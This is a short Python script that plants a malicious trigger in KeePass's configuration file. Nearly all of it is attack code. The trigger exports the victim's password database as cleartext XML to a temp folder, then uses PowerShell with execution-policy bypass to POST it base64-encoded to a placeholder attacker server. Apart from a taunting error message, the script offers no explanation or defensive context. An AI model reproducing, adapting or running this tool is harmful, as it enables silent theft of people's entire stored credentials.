import fileinput

exploit = '''
			<Triggers>
				<Trigger>
					<Guid>lztpSRd56EuYtwwqntH7TQ==</Guid>
					<Name>exploit</Name>
					<Events>
						<Event>
							<TypeGuid>s6j9/ngTSmqcXdW6hDqbjg==</TypeGuid>
							<Parameters>
								<Parameter>0</Parameter>
								<Parameter />
							</Parameters>
						</Event>
					</Events>
					<Conditions />
					<Actions>
						<Action>
							<TypeGuid>D5prW87VRr65NO2xP5RIIg==</TypeGuid>
							<Parameters>
								<Parameter>%temp%\exploit.xml</Parameter>
								<Parameter>KeePass XML (2.x)</Parameter>
								<Parameter />
								<Parameter />
							</Parameters>
						</Action>
						<Action>
							<TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
							<Parameters>
								<Parameter>PowerShell.exe</Parameter>
								<Parameter>-ex bypass -noprofile -c Invoke-WebRequest -uri {INSERTATTACKSERVERHERE}\exploit.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('%temp%\exploit.xml'))) </Parameter>
								<Parameter>False</Parameter>
								<Parameter>1</Parameter>
								<Parameter />
							</Parameters>
						</Action>
					</Actions>
				</Trigger>
			</Triggers>
'''

try:
    with fileinput.FileInput('E:\\Program Files (x86)\\KeePass Password Safe 2\\KeePass.config.xml', inplace=True, backup='.bak') as file:
        for line in file:
            print(line.replace('<Triggers />', exploit), end='')
except:
    try:
        with fileinput.FileInput('C:\\Program Files (x86)\\KeePass Password Safe 2\\KeePass.config.xml', inplace=True, backup='.bak') as file:
            for line in file:
                print(line.replace('<Triggers />', exploit), end='')
    except:
        print('That file doesn\'t exist! You baka!')


